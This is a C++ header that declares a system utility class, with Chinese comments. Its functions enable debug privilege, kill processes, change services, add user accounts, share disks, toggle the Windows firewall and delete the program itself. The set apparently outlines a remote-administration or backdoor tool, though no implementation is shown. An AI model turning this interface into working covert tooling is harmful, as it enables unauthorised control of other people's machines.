// SystemUtility.h: interface for the CSystemUtility class.
//
//////////////////////////////////////////////////////////////////////
#include <vector>
#include "UtilityStruct.h"
#if !defined(AFX_SYSTEMUTILITY_H__5D7DF9EC_BFB7_4F1E_9BE2_4F601A1A41E9__INCLUDED_)
#define AFX_SYSTEMUTILITY_H__5D7DF9EC_BFB7_4F1E_9BE2_4F601A1A41E9__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class CSystemUtility  
{
public:
	CSystemUtility();
	virtual ~CSystemUtility();

	static BOOL CALLBACK EnumWindowsProc( HWND hWnd, LPARAM lParam);

	
	BOOL		EnableDebugPriv();
	BOOL		ForceExitWindow(UINT uFlags);

	BOOL		DrawScreenText(CString strText,UINT nFontHeight = 50,COLORREF clrFont = RGB(0,0,255));
	
	//			文件及目录操作
	BOOL		LocalFileExcute(CString strFileName,BOOL bNormal);
	BOOL		LocalFileDelete(CString strFileName,BOOL bDir = FALSE);
	BOOL		LocalFileDirCreate(CString strFileName);
	BOOL		GetPathList(CString strPath,std::vector<FILE_INFO_S>* pVecTor);

	//			获取窗口列表
	DWORD		GetWindowsList(std::vector<WINDOW_INFO_S>* pVecTor);
	
	//			获取当前进程列表
	DWORD		GetProcessList(std::vector<PROCESS_INFO_S>* pVecTor);
	//			关闭进程
	BOOL		KillProcess(DWORD dwProcessId);
		
	//			获取当前服务列表
	DWORD		GetServiceList(std::vector<SERVICE_INFO_S>* pVecTor);
	//			修改服务启动类型
	BOOL		SetServiceStartType(CString strServiceName,DWORD dwStartType); 
	//			修改服务状态
	BOOL		SetServiceState(CString strServiceName,DWORD dwState);
	
	//			添加或删除用户
	BOOL		NetUser(BOOL bAdd,CString strUser,CString strPWD);

	//			将某磁盘做为共享或关闭共享
	BOOL		NetShare(BOOL bAdd,CString strDisk);

	//			开始或关闭WINDOWS防火墙
	BOOL		NetFireWall(BOOL bStart);
	
	//			删除自身程序文件,该函数调用结束,需退出程序
	BOOL		DeleteSelf();


protected:
	BOOL		DeleteDirectory(char *DirName);
		
};

#endif // !defined(AFX_SYSTEMUTILITY_H__5D7DF9EC_BFB7_4F1E_9BE2_4F601A1A41E9__INCLUDED_)
